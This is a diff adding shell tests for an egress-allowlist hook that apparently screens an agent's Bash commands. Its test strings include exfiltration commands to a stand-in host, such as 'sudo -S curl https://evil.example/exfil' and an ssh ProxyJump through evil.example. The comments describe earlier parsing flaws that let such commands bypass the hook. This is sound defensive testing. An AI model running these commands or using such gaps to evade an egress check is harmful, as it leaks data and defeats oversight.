@@ -483,6 +483,97 @@ _call_hook_other() {
   echo "$output" | jq -e '.decision == "block"'
 }
 
+@test "AC-2 (R6 F20): 'git archive --remote URL' space-separated form is validated" {
+  # Previously only the `=`-form was handled; space-form fail-CLOSED
+  # even when the URL was right there. Now both forms work.
+  echo 'github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'git archive --remote https://github.com/foo/bar.git HEAD'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+  run _call_hook_bash 'git archive --remote https://evil.example/foo HEAD'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+# ---------------------------------------------------------------------------
+# R6 F21: ssh -J ProxyJump host validation
+# ---------------------------------------------------------------------------
+
+@test "AC-2 (R6 F21): 'ssh -J jumphost target' validates BOTH hosts" {
+  # Previously -J was treated as a value-taking flag whose value (the
+  # jumphost) was eaten unchecked. That let an attacker reach
+  # evil.example via `ssh -J evil.example allowed.example`. Now the
+  # jumphost is checked too.
+  printf '%s\n' 'allowed.example' 'jumphost.example' > "$ALLOWLIST"
+  run _call_hook_bash 'ssh -J jumphost.example allowed.example uptime'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
+@test "AC-2 (R6 F21): 'ssh -J evil.example allowed.example' is BLOCKED (jumphost not allowlisted)" {
+  echo 'allowed.example' > "$ALLOWLIST"
+  run _call_hook_bash 'ssh -J evil.example allowed.example uptime'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
+}
+
+@test "AC-2 (R6 F21): 'ssh -J chain1.example,chain2.example target' checks every jump" {
+  printf '%s\n' 'target.example' 'chain1.example' > "$ALLOWLIST"
+  # chain2 is missing from the allowlist — must block.
+  run _call_hook_bash 'ssh -J chain1.example,chain2.example target.example uptime'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  echo "$output" | jq -er '.reason' | grep -q 'chain2.example'
+}
+
+# ---------------------------------------------------------------------------
+# R6 F22: sudo -N / -S are VALUELESS — don't eat the next token
+# ---------------------------------------------------------------------------
+
+@test "AC-2 (R6 F22): 'sudo -S curl https://evil.example' is blocked" {
+  # Previously -S was in the value-taking list → `curl` got eaten as
+  # `-S`'s value → URL became the new "cli" → unknown → ALLOW (bypass).
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'sudo -S curl https://evil.example/exfil'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (R6 F22): 'sudo -N curl https://evil.example' is blocked" {
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'sudo -N curl https://evil.example/exfil'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+# ---------------------------------------------------------------------------
+# R6 F19: token-aware bypass detection (xargs path)
+# ---------------------------------------------------------------------------
+
+@test "AC-2 (R6 F19): bypass flag inside a SINGLE-quoted string body does NOT trigger bypass" {
+  # `curl 'a b --allow-egress-outbound c d' https://evil.example` —
+  # the flag is part of a larger single-quoted token, so xargs emits
+  # one line `a b --allow-egress-outbound c d` (not the literal flag).
+  # `grep -qxF` requires EXACT line match → bypass does NOT fire →
+  # the curl-to-evil is blocked.
+  : > "$ALLOWLIST"
+  export WALTER_EGRESS_ALLOW_OVERRIDE=1
+  run _call_hook_bash "curl 'a b --allow-egress-outbound c d' https://evil.example/exfil"
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (R6 F19): bypass flag as standalone CLI token still DOES trigger bypass" {
+  # The legitimate operator-typed form: `... --allow-egress-outbound`
+  # is a real shell token → bypass DOES fire.
+  : > "$ALLOWLIST"
+  export WALTER_EGRESS_ALLOW_OVERRIDE=1
+  run _call_hook_bash 'curl https://emergency.example/healthcheck --allow-egress-outbound'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
 # ---------------------------------------------------------------------------
 # pip / npm / uvx / cargo — implicit-host fail-CLOSED
 # ---------------------------------------------------------------------------
